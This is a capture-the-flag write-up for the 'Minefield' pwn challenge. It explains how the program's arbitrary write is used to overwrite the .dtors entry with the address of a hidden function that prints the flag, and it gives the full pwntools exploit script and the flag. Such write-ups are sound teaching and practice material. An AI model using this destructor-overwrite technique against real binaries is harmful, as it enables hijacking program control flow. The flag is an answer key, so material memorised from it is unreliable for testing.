# Minefield

## Challenge

The program gives us an arbitrary 8-byte write and includes a "win function".

### Mitigations

```
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

## Solution

The `_` function is not called by the program, but will print the flag if executed:

```c
void sym._(void)
{
    int64_t iVar1;
    undefined8 uVar2;
    int64_t in_FS_OFFSET;
    char *ptr;
    int64_t canary;
    
    iVar1 = *(int64_t *)(in_FS_OFFSET + 0x28);
    uVar2 = sym.imp.strlen("\nMission accomplished! ✔\n");
    sym.imp.write(1, "\nMission accomplished! ✔\n", uVar2);
    sym.imp.system("cat flag*");
    if (iVar1 != *(int64_t *)(in_FS_OFFSET + 0x28)) {
    // WARNING: Subroutine does not return
        sym.imp.__stack_chk_fail();
    }
    return;
}
```

Using the arbitrary write, we can overwrite dtors to execute this function after the program returns.

## Exploit

```py
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host localhost --port 1337 minefield
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('minefield')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'localhost'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

dtors = 0x00601078
win = exe.sym["_"]

io.recvuntil("ready.\n")
io.sendline("2")

io.recvuntil("mine: ")
io.send(str(dtors))

io.recvuntil("plant: ")
io.send(str(win))

io.interactive()
```

## Flag

`CHTB{d3struct0r5_m1n3f13ld}`

